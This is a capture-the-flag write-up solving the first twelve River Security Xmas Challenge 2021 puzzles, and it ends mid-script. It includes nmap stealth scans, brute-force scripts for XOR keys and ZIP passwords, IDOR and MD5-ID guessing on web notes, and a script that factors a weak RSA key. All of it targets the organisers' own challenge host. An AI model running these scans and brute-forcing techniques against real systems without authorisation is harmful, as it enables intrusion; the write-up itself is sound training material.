# River Security Xmas Challenge (RSXC) 2021
[River Security](https://riversecurity.eu) had a 24 part computer security related [capture the flag (CTF)](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)) challenge going from December 1st to December 24th 2021.

Announcement: https://riversecurity.eu/countdown-to-christmas-with-us/  
CTF site: https://rsxc.no  
Target box: rsxc.no  
Prices: [Burp Suite](https://portswigger.net/burp/pro) license, [Apple TV](https://www.apple.com/apple-tv-4k/), [Onyx Studio 4 speaker](https://harmankardon.com/bluetooth-docks/ONYX+STUDIO+4.html)
   
   
   
## 1 - The search

### Challenge
> Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges '**RSXC{flag}**'. If another flag format is used, the challenge text will mention this.
> 
> In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it's in the range 30 000-31 000.

### Tools used
 - [`nmap`](https://nmap.org)
 - [`nc`](https://en.wikipedia.org/wiki/Netcat)

### Solution
A great tool for finding open ports is using the network mapper nmap.

First I tried the standard scan:  
`$ nmap -vv -p30000-310000 rsxc.no`

The ports seemed to be filtered as there were no responses back.

Doing a more stealth scan without pinging the host and using _TCP SYN scan_ did the trick:
```sh
$ nmap -vv -Pn -sS -p30000-31000 rsxc.no
...
Discovered open port 30780/tcp on 134.209.137.128
```

Connecting to the port gave the flag back:
```sh
$ nc rsxc.no 30780
RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}
```

### Flag
**The flag was `RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}`**.  
   
   
   
## 2 - A magic word

### Challenge
> We have found a magical port that is listening on port 20002, maybe you can find todays flag there?
> 
> rsxc.no:20002

### Tools used
 - [Python](https://python.org)

### Solution
The challenge title mentions a "word". A [`word`](https://en.wikipedia.org/wiki/Word_(computer_architecture)) can be of different sizes, from 1 to several bytes.

Sending a random byte to `rsxc.no:20002` gave back the text `That is not the byte I want!`. I created a small Python 3 script to send the bytes `0x00` - `0xFF`:

```py
import socket
from time import sleep

HOST = 'rsxc.no'
PORT = 20002

for b in range(0x00, 0xFF + 1):
    print('Trying', hex(b))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(b.to_bytes(1, byteorder='big'))
    response = s.recv(1024).decode('UTF-8')
    s.close()
    if not 'That is not the byte I want!' in response:
        print('Got flag:', response)
        exit()
    sleep(0.5)
print('Failed to get flag.')
```

Running the script gives the following output:
```
Trying 0x0
Trying 0x1
...
Trying 0xd4
Got flag: RSXC{You_found_the_magic_byte_I_wanted_Good_job!}
```

### Flag
The magic byte was `0xD4`. **The flag was `RSXC{You_found_the_magic_byte_I_wanted_Good_job!}`**.  
   
   
   
## 3 - What does this mean?

### Challenge
> When looking for the prizes to this challenge we came across some text we can't understand, can you help us figure out what it means?
> 
> https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt

### Input
[03-challenge.txt](./files/03-challenge.txt):
```
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS
```

### Hint
River Security posted a hint for this challenge (as the only one) on `#rsxc-hints` at [their challenge Discord](https://discord.gg/QaXdZHFDnA):
> The chef can solve it all, but his magic can't do it alone

### Tools used
 - [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base58('rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz',false)Bzip2_Decompress(false)From_Base85('!-u')From_Morse_Code('Space','Line%20feed')From_Hex('None')From_Base32('A-Z2-7%3D',false)&input=WmxoVFdrNUtRVFY2ZDNKdVZ6TnBRbkZ5ZUdsNWNYTmtTRWRCZWxaV1ZrZE9NVlZYUmtRelZHNVhRamhTU2xCeFUzVlZRak52VkdabFRqSm1kbGwwWm5WRGF6UnlSemswU3pSWVN6VXhkemx3Wmt0VFkxcHFNVGRCZVhOS2EwWldaVnBHZFhWNlNuaDFZbUYwT1dST1JXSkJiVk5HVTBSQmVEaHZka1pHVGpoNVZHNDRXbmhLVWpVMlRIWjZORlUxZFZsb2VURXhhRVZFWnpSbFNHbFRTMjlFV25Kdk5UVldUbmczTlVONFJXSndSblJuT1VkRFpWUjJkRXRDVmxkS2FqVldPRlJ3T0ZJelVYSTRXbWhSVkVoT04zQkdRWE00Tldkb01YTnpOVXhYY1hwbFVXNWtUVmRuZW5saWFIZ3hSRlUwUmxjek5YQlRVMmRyZGtWdFlqYzJkbkUyVERsemVFUllRWHBUY1hveE56Rk9Na1ptWjFNNGFHZG1aRlk0Vm1wblFXbEljMUkzWmpVMlpqZEJjMmgyY0Zad2RtWm1PVmQwVlVablNqSkZSVkJYZUVOQ2VGVkhPWFJRVkZwallUbEZVWGN6YUZKVWQxTTBSbFpsVEUxVFVITkNkWHBLV1RkeFUwNDNjRXM1YlRsS05XczNjVFJOYVdJMlltMUxlbTl1WVhrMWJVVk5lWEp0WVZOVk5GVm5XbTlWZUc5S2RrUnJWa2hT)

### Solution
This was a tricky one. I used CyberChef a lot to dig into the text, but I couldn't get anything too sensible. I got a hint that the challenge was 100% solvable in CyberChef and that there was something about understanding which encoding I had in front of me. It turned out that I was struggling with what was the only step CyberChef wouldn't do automagically.

There were quite a few layers of the encoded text:
1. From Base64 🪄
2. From Base58 🪄
3. Bzip2 decompress 🪄
4. From Base85
5. From Morse code 🪄
6. From Hex 🪄
7. From Base32 🪄

 🪄 = suggested by CyberChef's magic.

### Flag
**The flag was `RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}`**.  
   
   
   
## 4 - 4 Bytes of XOR

### Challenge
> The flag of the day can be found by xor'ing our text with 4 bytes.
> 
> https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt

### Input
[04-challenge.txt](./files/04-challenge.txt):
```
0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8
```

### Tools used
 - [Python](https://python.org)

### Solution
The challenge text really said it all. There's a file which contents (ciphertext) should be XOR'ed with 4 bytes (the key) to get the flag (plaintext). While the file was a text file, its content is a string of hex values.

I tried to bruteforce XOR'ing all values from 0x00000000 to 0xFFFFFFFF. The code below assumes that the flag starts with `RSXC` and is optimized for speed a bit by not printing too much output and by only XOR'ing the first bytes at first before doing the whole string once successful.


```py
import datetime

raw_input = '0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8'

hex_input = [raw_input[i+2:i+4] for i in range(0, len(raw_input), 4)] # Removing 0x
hex_input =''.join(hex_input) # List to string
print('\nInput:', hex_input,'\n\n')
hex_input =  bytearray.fromhex(hex_input) # We got our final input byte array of hex data
hex_input_short = hex_input[0:4] # Using a shorter bytearray for testing - assuming flag/result will start with RSXC

def xor(data, key):
    key = key * (len(hex_input) // len(key) + 1)
    return bytearray(a ^ b for a, b in zip(*map(bytearray, [data, key])))

def print_status(percentage, key, xor_result):
    delta = datetime.datetime.now() - start_time
    print(delta,'-','{:.2f}%'.format(percentage), '-', 'key', key.hex(), '-', 'result', xor_result)

start_time = datetime.datetime.now()
# Tip: We can start at e.g. 0x88C34A9f to make the script run quick for PoC
for key in range(0x00000000, 0xffffffff + 1):
    percentage = key/0xffffffff # Just to have an idea of how far we have come
    should_print_status = key % 1000000 == 0 # Only once in a while we print status
    key = key.to_bytes(4, "big") # Key as bytes
    try:
        xor_result = xor(hex_input_short, key).decode("utf-8")
        if 'RSXC' in xor_result:
            print_status(percentage, key, xor_result) # 0:07:01.937460 - 53.43% - key 88c554d5 - result RSXC
            xor_result = xor(hex_input, key).decode("utf-8") # Let's do it again with all bytes
            print('\nFound flag:', xor_result) #RSXC{Most_would_say_XOR_isn't_that_useful_anymore}
            exit(0)
        if should_print_status:
            print_status(percentage, key, xor_result)
    except UnicodeDecodeError as e:
        if should_print_status:
            print_status(percentage, key, str(e))

print('Did not find any flag.')
```

Running the script gave output like this:
```
Input: da960c96f3883ba6fc9a23bafda9308afba42d8ad08a068ae1b63af2fc9a20bde9b10ba0fba032a0e49a35bbf1a83ba7edb8 


0:00:00.000014 - 0.00% - key 00000000 - result 'utf-8' codec can't decode byte 0x96 in position 3: invalid start byte
0:00:01.453377 - 0.00% - key 000f4240 - result 'utf-8' codec can't decode byte 0xd6 in position 3: unexpected end of data
...
0:07:01.298271 - 53.42% - key 88bba980 - result 'utf-8' codec can't decode byte 0xa5 in position 2: invalid start byte
0:07:01.937460 - 53.43% - key 88c554d5 - result RSXC

Found flag: RSXC{Most_would_say_XOR_isn't_that_useful_anymore}
```

Using the key `88c554d5` I got the flag. This can be [verified using CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'88c554d5'%7D,'Standard',false)&input=ZGE5NjBjOTZmMzg4M2JhNmZjOWEyM2JhZmRhOTMwOGFmYmE0MmQ4YWQwOGEwNjhhZTFiNjNhZjJmYzlhMjBiZGU5YjEwYmEwZmJhMDMyYTBlNDlhMzViYmYxYTgzYmE3ZWRiOA).

### Flag
**The flag was `RSXC{Most_would_say_XOR_isn't_that_useful_anymore}`**.  
   
   
   
## 5 - Plain discussion

### Challenge
> A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
> 
> https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap

### Input
 - [05-challenge.pcap](./files/05-challenge.pcap)

### Tools used
- [Wireshark](https://www.wireshark.org)
- [Python](https://python.org)

### Solution
A [`pcap`](https://en.wikipedia.org/wiki/pcap) file is a packet capture file which can be opened in e.g. Wireshark. By doing a quick glance and searching for a key word like _"flag"_ is what it takes:

![image](https://user-images.githubusercontent.com/832005/144742225-a5b13b04-5191-4faa-b370-1e1437d5b7af.png)

Seemingly a user is logging in using `FTP` in cleartext and uploading a file `flag.zip`:
<img src="https://user-images.githubusercontent.com/832005/144742276-6f3c09d0-1f27-4c0c-b5eb-98dbeeecafce.png" width="600"/>

Since also the ZIP file itself is uploaded via cleartext we can easily extract it from Wireshark:
<img src="https://user-images.githubusercontent.com/832005/144742577-c2ad4418-8026-46e4-93b4-ac3b12fdaf93.png" width="600"/>

Unfortunately the ZIP file was password protected and the password from the login had not been reused:
```sh
$ unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
password incorrect--reenter: 
   skipping: flag.txt                incorrect password
```

First I created a Python script trying to crack the ZIP file using the password list `RockYou.txt` and brute forcing using all combinations of printable ASCII characters length 1-4, but none of those passwords worked. So I went back to the `pcap` file and found an [IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat) chat (also in clear text) where there's a password hint:

<img src="https://user-images.githubusercontent.com/832005/144746835-8b7ac892-c696-46ca-a23e-f1683f1e1611.png" width="600"/>

I then changed the script to brute force with those password requirements:
```py
from zipfile import ZipFile

with ZipFile('flag.zip') as zip_file:
    for password in range(9954000000, 10000000000): # "a 10 digit long number above 9 954 000 000 as the password"
        should_print = password % 10000 == 0 # Speeding up a bit by not constantly printing status
        password = str(password)
        if should_print:
            print('Trying [%s]' % password)
        try:
            zip_file.extractall(pwd=bytes(password, 'utf-8'))
            print('Correct password:', password) # 9954359864
            with open('flag.txt') as f:
                print('Flag:', f.read()) # RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}
            exit()
        except Exception as e: # Trying to extract with the wrong password will throw
            pass
```

Using the password `9954359864` one could get the flag file.

### Flag
**The flag was `RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint}`**.  
   
   
   
## 6 - The indecipherable cipher

### Challenge
> We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
> 
> https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt

### Input
[06-challenge.txt](./files/06-challenge.txt):
```
PEWJ{oqfgpylasqaqfzmgloxjgcezyigbglx}
```

### Tools used
 - [dcode.fr](https://www.dcode.fr/vigenere-cipher)

### Solution
At first glance the ciphertext looked like some sort of [substitution cipher](https://en.wikipedia.org/wiki/Substitution_cipher). A quick [google search for _"indecipherable cipher"_](https://www.google.com/search?q=indecipherable%20cipher) gave overwhelming many hits for the good old [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher). (It turns out it got just that description in French (_"le chiffrage indéchiffrable"_) since it wasn't broken for centuries.)

If the key would have been as long as the message itself ([one-time pad](https://en.wikipedia.org/wiki/One-time_pad)) I wouldn't have been able to break it. To solve this challenge I assumed that the plaintext started with `RSXC{`.

I used [dcode.fr's decryption for Vigenère cipher](https://www.dcode.fr/vigenere-cipher) for deciphering. It turned out the key was 5 characters long: `YMZHG`

[The solution can be seen at CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('YMZHG')&input=UEVXSntvcWZncHlsYXNxYXFmem1nbG94amdjZXp5aWdiZ2x4fQ).

I did create a Python script for doing the decoding, but as the key being longer than the known plaintext I would have had to add in some English dictionary to be able to pick out the solution without solving it visually. Because of that I didn't include the script here.

### Flag
**The plaintext and flag was `RSXC{isthisnotjustafancycaesarcipher}`**.  
   
   
   
## 7 - This is quite meta
### Challenge
> We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
> 
> https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg

### Input
[07-challenge.jpg](./files/07-challenge.jpg):  
<img src="./files/07-challenge.jpg" width="400"/>

### Tools used
- [`exiftool`](https://en.wikipedia.org/wiki/ExifTool)

### Solution
The challenge text and looking image itself left an impression that the bottom half of the image with the flag was cropped out. I started out trying `file` and `strings` without getting any hints. Luckily `exiftool` found something interesting:
```
$ exiftool 07-challenge.jpg
ExifTool Version Number         : 12.30
File Name                       : 07-challenge.jpg
...
Thumbnail Offset                : 199
...
Thumbnail Image                 : (Binary data 2265 bytes, use -b option to extract)
```

There was a thumbnail inside the image file. I extracted and opened the thumbnail and got the flag:
```
$ exiftool -b -ThumbnailImage 07-challenge.jpg > thumb.jpg
$ open thumb.jpg
```

An alternative way of getting the image data could be using [`binwalk`](https://github.com/ReFirmLabs/binwalk):
```
$ binwalk 07-challenge.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
91            0x5B            TIFF image data, big-endian, offset of first image directory: 8
199           0xC7            JPEG image data, JFIF standard 1.01

$ binwalk -D='.*' 07-challenge.jpg
$ # Rename to .jpg and open:
$ mv _07-challenge.jpg.extracted/C7 $_.jpg;open $_
```

### Flag
**The flag hiding in the thumbnail was `RSXC{Sometimes_metadata_hides_stuff}`**.  
   
   
   
## 8 - The reference
### Challenge
> I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
> 
> http://rsxc.no:20008

### Tools used
 - Web browser

### Solution
This one was very simple and quick to solve. It took only a few seconds using the web browser on my mobile. Even the link titles starting on number `2` hinted to what we were after:

![image](https://user-images.githubusercontent.com/832005/145202882-fbc82e17-8cb8-4002-b8b2-e735a93b92ee.png)

The links pointed to `notes.php`:
 - `notes.php?id=2`
 - `notes.php?id=3`
 - `notes.php?id=4`

It was very natural to try out `notes.php?id=1`, and that page gave another hint:
> Today I learned an interesting fact! When computers count, they start at 0.

Going to `notes.php?id=0` gave the flag and confirmed that the challenge was all about [IDOR (insecure direct object reference)](https://en.wikipedia.org/wiki/Insecure_direct_object_reference)

### Flag
**The flag was `RSXC{Remember_to_secure_your_direct_object_references}`**.  
   
   
   
## 9 - The reference 2

### Challenge
> I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
> 
> http://rsxc.no:20009
>  

### Tools used
 - Web browser
 - `md5`

### Solution
This challenge was a little bit more advanced than the previous day, though still pretty simple.

![image](https://user-images.githubusercontent.com/832005/145425283-001e2274-8f51-423b-9ec4-743f11463e90.png)

The text refers to [RFC 1321](https://www.ietf.org/rfc/rfc1321.txt) which is the MD5 message-digest algorithm. `note3` with id `7a14c4e4e3f8a3021d441bcbae732c8b` stated the following:
> I have decided on using the naming convention "note" plus id number. So for instance this would be "note3"

```sh
$ echo -ne 'note0' | md5
65b29a77142a5c237d7b21c005b72157
````

`note0` had the following text:
> I have now hidden the **flag** with a custom naming convention. I just have to remember that the input to the md5sum for it is all lower case and 4 characters long. (Hint: no need to bruteforce...)

```sh
echo -ne 'flag' | md5                 
327a6c4304ad5938eaf0efb6cc3e53dc
```

Going to note with id `flag` as a MD5 sum gave the flag.

### Flag

**The flag was `RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}`**.  
   
   
    
## 10 - Lookup

### Challenge
> Sometimes you need to look up to get the answer you need.
> 
> http://rsxc.no:20010

### Tools used
 - Web browser / [curl](https://en.wikipedia.org/wiki/CURL)

### Solution
The challenge linked to a web page with an input field and a submit button where one could _"look up_" things. However, seemingly no matter what one entered the site always responded with the same message error message _"Could not find what you searched for!"_.

<img src="https://user-images.githubusercontent.com/832005/145523540-e9c72d64-24b6-4421-a7b4-46c2092b45f6.png" width="600"/>

One of the first things I always do when looking for clues is to open [Vivaldi developer tools](https://help.vivaldi.com/desktop/tools/developer-tools/) and I immediately saw the flag being transferred as a _HTTP response header_.

To do it on the command line one could do something this:
```sh
curl -sS -I http://rsxc.no:20010 | grep RSXC
Flag: RSXC{Sometimes_headers_can_tell_you_something_useful}
```

(`-sS` = silent, but show errors, `-I` = `HEAD` call)

### Flag
**The flag was `RSXC{Sometimes_headers_can_tell_you_something_useful}`**.  
   
   
   
## 11 - The not so random prime

### Challenge
> We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
> 
> https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip

### Input
[11-challenge.zip](./files/11-challenge.zip) contained the following two files:
`rsa.out`:
```
1415732912633110850463082290910531310944025185851628960496687559483254746929720221647023240242336158686917844098726955123922281990353849950572386591304198809887980195592164437463694396551629025725893297740721210740603852117845187276240822110209890805395726319272811238182117091397934074647625229734002195089686974969651954470535554347943901878883362518072923354248859147416112318206824337487445716704648503565676180267966061851236231329358955557146660099270996351905681299543490284088388917086359028800783355214649085181453134992031245774041645632697445995388906670744100784647364712047823965135210709248854353892069782338755245211910680179291304283133858067808724881428158118018329116480623919406482183591009161012049808848921597384462762413755053792928218673793301012582611446447895722794852586858407955308203712823698883371297395149325161872495891941488144882598336487422503139931872453298083167787506759793770112004781589

MybmIUY2CCSU7M6ojf6PjIXcECMBRgJRH1n1U15dB7L5VXgD4uC8Ry3U+isYpLlhEkw3HjmCTMjPM1trqON1eoV/ZGhtfQvK/iy/FdyAPmV6ykLofWBqFViMGtWebYRYqqKubbMux4aupS4uu2ppR+VIjqOBDuiMwqxvRzxGcRsc7vMGhi6F8qfBuiD+V1Kfe9MhhU1vxNb8a745qLSRc8wjIYQ4a4lPqy0H3dBPuoT3clR9A0dTvQsTq5kfUGBC072ij2RFpBBW9d2qj+KihLapaH6I1ZyZmmBFl83+Qb5QbM0RBB/wAfOKfZ3lfPoRpEjST9MX/J/RBvlaCPaqpkApNCr5bV/6rqxs+paN08bkvdQ5tapcSWR9jXuw+mY1RzS9sb7rbaBoVdwArEUyJwlUBoLiNxkE6w6NPgKpNpmQ08Tm8b1PK2CAs6TW9e6JphwpZlsy76BSpEJgFHLpeqNxmgAY1ESGfCx9soiv9KSPYMvDkm4JbmtH7GHqslzB
```
`rsa.py`:
```py
from Crypto.PublicKey import RSA #pycryptodome
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert
import base64

p = randprime(2**1023, 2**1024)
q = nextprime(p*p)

n = p*q
e = 65537

phi = (p-1)*(q-1)
d = int(invert(e,phi))

key = RSA.construct((n,e,d,p,q))
rsa = PKCS1_OAEP.new(key)

print(n)
print()
print(base64.b64encode(rsa.encrypt(open('./flag.txt','rb').read())).decode("ascii"))
```
 
### Tools used
 - [Python](https://python.org)
 - [Symbolab](https://www.symbolab.com/solver/equation-calculator)
 - [dCode](https://www.dcode.fr/cube-root)

### Solution
#### Step 1 - understanding the code
The Python script used the [public-key cryptosystem RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)). The security of RSA relies on the practical difficulty of factoring the product of two large prime numbers - `p` and `q`. The numbers should be random (which the challenge text suggested it isn't.)

It took me some time to realize what the problem was and how to crack the key. What helped me the most was the article [Understanding Common Factor Attacks:
An RSA-Cracking Puzzle](http://www.loyalty.org/~schoen/rsa/).

The prime number `p` was set to a random number between 2^1023 and 2^1024. That's a pretty big number and if the randomness is good it should be fine. `q`, however, was set to the next prime greater than `p * p`. Already at this stage the implementation fell to pieces. Since `n = p * q` and one knew `n` and about what `q` is one could start calculating backwards. For simplicity I set `q = p * p`:

```
n = p * q
n = p * (p * p)
n = p3
p = ∛n
```

Since there are so many prime numbers it's expected that `p` should be somewhere near `p = ∛n`. Luckily it's very easy to test and see if the parameters are correct or not.

#### Step 2 - decrypting the message
Using [dCode's cube root calculator](https://www.dcode.fr/cube-root) actually gave the exact number needed for `p`:

```py
from Crypto.PublicKey import RSA  # pycryptodome
from Crypto.Cipher import PKCS1_OAEP
from sympy import nextprime, invert
import base64

# The public key from rsa.out:
n = 1415732912633110850463082290910531310944025185851628960496687559483254746929720221647023240242336158686917844098726955123922281990353849950572386591304198809887980195592164437463694396551629025725893297740721210740603852117845187276240822110209890805395726319272811238182117091397934074647625229734002195089686974969651954470535554347943901878883362518072923354248859147416112318206824337487445716704648503565676180267966061851236231329358955557146660099270996351905681299543490284088388917086359028800783355214649085181453134992031245774041645632697445995388906670744100784647364712047823965135210709248854353892069782338755245211910680179291304283133858067808724881428158118018329116480623919406482183591009161012049808848921597384462762413755053792928218673793301012582611446447895722794852586858407955308203712823698883371297395149325161872495891941488144882598336487422503139931872453298083167787506759793770112004781589

# From https://www.dcode.fr/cube-root , p should be somewhere near ∛n:
p = 112286387414431191084340808417072547014839297152599725820454940371239217590992006903954687204813313101800680813960917916690912681257757145943379344088372128505672622510768245951965177196736140027003747088716724087793479637763968902608803708692114340399144539405520023868396501357758436512892759718479568171933
q = nextprime(p*p)

n = p*q
e = 65537

phi = (p-1)*(q-1)
d = int(invert(e, phi))

key = RSA.construct((n, e, d))
rsa = PKCS1_OAEP.new(key)

cipher_base64 = 'MybmIUY2CCSU7M6ojf6PjIXcECMBRgJRH1n1U15dB7L5VXgD4uC8Ry3U+isYpLlhEkw3HjmCTMjPM1trqON1eoV/ZGhtfQvK/iy/FdyAPmV6ykLofWBqFViMGtWebYRYqqKubbMux4aupS4uu2ppR+VIjqOBDuiMwqxvRzxGcRsc7vMGhi6F8qfBuiD+V1Kfe9MhhU1vxNb8a745qLSRc8wjIYQ4a4lPqy0H3dBPuoT3clR9A0dTvQsTq5kfUGBC072ij2RFpBBW9d2qj+KihLapaH6I1ZyZmmBFl83+Qb5QbM0RBB/wAfOKfZ3lfPoRpEjST9MX/J/RBvlaCPaqpkApNCr5bV/6rqxs+paN08bkvdQ5tapcSWR9jXuw+mY1RzS9sb7rbaBoVdwArEUyJwlUBoLiNxkE6w6NPgKpNpmQ08Tm8b1PK2CAs6TW9e6JphwpZlsy76BSpEJgFHLpeqNxmgAY1ESGfCx9soiv9KSPYMvDkm4JbmtH7GHqslzB'
print(rsa.decrypt(base64.b64decode(cipher_base64))) # Prints RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}
```

When I tried to use Python to calculate ∛n I always got a number a bit too far from dCode's answer. I created a script that uses that ∛n as a starting point and that finds the correct factors `p` and `q` and decrypts the message which contained the flag:

```py
from Crypto.PublicKey import RSA  # pycryptodome
from Crypto.Cipher import PKCS1_OAEP
from sympy import nextprime, invert
import base64
from decimal import Decimal
from decimal import getcontext
from time import time

start_time = time()
clear_screen = '\033[H\033[J'
color_cyan = '\033[96m'
color_blue = '\033[94m'
color_red = '\033[91m'
color_white = '\33[37m'
color_reset = '\033[0m'


def print_debug(current_digit, tmp_p, p, q, n, current_too_big):
    output = clear_screen + "p'="
    output += color_cyan + tmp_p[0:current_digit] + color_reset
    output += (color_red if current_too_big else color_blue) + \
        tmp_p[current_digit] + color_reset
    output += color_white + tmp_p[current_digit + 1:] + color_reset
    output += ', p=' + str(p)
    output += ', q=' + str(q)
    output += ', n=' + str(n)
    print(output)


# The public key from rsa.out:
n_to_find = 1415732912633110850463082290910531310944025185851628960496687559483254746929720221647023240242336158686917844098726955123922281990353849950572386591304198809887980195592164437463694396551629025725893297740721210740603852117845187276240822110209890805395726319272811238182117091397934074647625229734002195089686974969651954470535554347943901878883362518072923354248859147416112318206824337487445716704648503565676180267966061851236231329358955557146660099270996351905681299543490284088388917086359028800783355214649085181453134992031245774041645632697445995388906670744100784647364712047823965135210709248854353892069782338755245211910680179291304283133858067808724881428158118018329116480623919406482183591009161012049808848921597384462762413755053792928218673793301012582611446447895722794852586858407955308203712823698883371297395149325161872495891941488144882598336487422503139931872453298083167787506759793770112004781589

getcontext().prec = 1000  # We want a precise calculation

# p should be somewhere near ∛n, but it's still so far from it that we
# just use it to get the length of the prime:
p_hacked = int(Decimal(n_to_find) ** Decimal(1. / 3))
p_hacked = '0' * (len(str(p_hacked)) + 1)
num_of_digits = len(p_hacked)
current_digit = 0
found_n = False
while current_digit < num_of_digits and not found_n:
    for i in range(0, 10):
        tmp = p_hacked[0:current_digit] + str(i) + p_hacked[current_digit + 1:]
        p = nextprime(tmp)
        q = nextprime(p*p)
        n = p*q
        print_debug(current_digit, tmp,  p, q, n, n > n_to_find)
        if n == n_to_find:
            found_n = True
            break
        elif n > n_to_find:  # Got too big n
            current_digit += 1  # Moving on to next digit
            break
        else:  # Got ok p so far
            p_hacked = tmp
            if i == 9:  # Got max digit
                current_digit += 1  # Moving on to next digit

if found_n:
    print(color_cyan + 'Found correct p, q and n!\n' + color_reset)
else:
    print(color_red + 'Failed to find p, q and n.\n' + color_reset)
    exit()

e = 65537

phi = (p-1)*(q-1)
d = int(invert(e, phi))

key = RSA.construct((n, e, d))
rsa = PKCS1_OAEP.new(key)

cipher_base64 = 'MybmIUY2CCSU7M6ojf6PjIXcECMBRgJRH1n1U15dB7L5VXgD4uC8Ry3U+isYpLlhEkw3HjmCTMjPM1trqON1eoV/ZGhtfQvK/iy/FdyAPmV6ykLofWBqFViMGtWebYRYqqKubbMux4aupS4uu2ppR+VIjqOBDuiMwqxvRzxGcRsc7vMGhi6F8qfBuiD+V1Kfe9MhhU1vxNb8a745qLSRc8wjIYQ4a4lPqy0H3dBPuoT3clR9A0dTvQsTq5kfUGBC072ij2RFpBBW9d2qj+KihLapaH6I1ZyZmmBFl83+Qb5QbM0RBB/wAfOKfZ3lfPoRpEjST9MX/J/RBvlaCPaqpkApNCr5bV/6rqxs+paN08bkvdQ5tapcSWR9jXuw+mY1RzS9sb7rbaBoVdwArEUyJwlUBoLiNxkE6w6NPgKpNpmQ08Tm8b1PK2CAs6TW9e6JphwpZlsy76BSpEJgFHLpeqNxmgAY1ESGfCx9soiv9KSPYMvDkm4JbmtH7GHqslzB'
print(rsa.decrypt(base64.b64decode(cipher_base64)))

print('\nTime spent:', (time() - start_time), 's')

"""
Found correct p, q and n!

b'RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}\n'

Time spent: 12383.701189756393 s
"""
```

### Flag
**The flag was `RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}`**.  
   
   
   
## 12 - Twelve seconds of encoding
### Challenge
> For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
> 
> rsxc.no:20012

### Tools used
 - [Python](https://python.org)

### Solution
I enjoyed this challenge. Connecting to `rsxc.no:20012` gave the following text + a task to complete:
> Good luck, you have 12 seconds to solve these 100 tasks!

One had to solve 100 different tasks sent from the server. A task was one of hex decoding, lower casing, Base64 decoding or reversing. Done fast enough gave the flag back.

Here's my script:
```py
import socket
from time import sleep
import re
import base64

HOST = 'rsxc.no'
PORT = 20012

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    done = False
    while not done:
